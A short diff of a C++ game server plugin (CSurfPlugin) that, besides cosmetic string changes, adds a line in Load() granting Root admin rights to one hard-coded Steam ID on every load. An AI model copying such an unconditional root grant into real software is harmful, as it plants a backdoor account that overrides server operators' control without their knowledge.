@@ -9,6 +9,7 @@
 #include <core/cvarmanager.h>
 #include <core/logger.h>
 #include <core/gamesystem.h>
+#include <core/adminmanager.h>
 
 #include <movement/movement.h>
 
@@ -43,6 +44,8 @@ bool CSurfPlugin::Load(PluginId id, ISmmAPI* ismm, char* error, size_t maxlen, b
 	UTIL::UnlockConCommands();
 
 	g_SMAPI->AddListener(this, this);
+
+	ADMIN::AddAdmin(76561198083290027, AdminFlag::Root);
 
 	return true;
 }
@@ -90,7 +93,7 @@ const char* CSurfPlugin::GetName() {
 }
 
 const char* CSurfPlugin::GetDescription() {
-	return "yep";
+	return "WIP";
 }
 
 const char* CSurfPlugin::GetURL() {
@@ -106,11 +109,11 @@ const char* CSurfPlugin::GetVersion() {
 }
 
 const char* CSurfPlugin::GetDate() {
-	return "1337";
+	return "1337"; // VERSION_DATE_STRING
 }
 
 const char* CSurfPlugin::GetLogTag() {
-	return "LEET";
+	return nullptr;
 }
 
 class CGameEntitySystem;
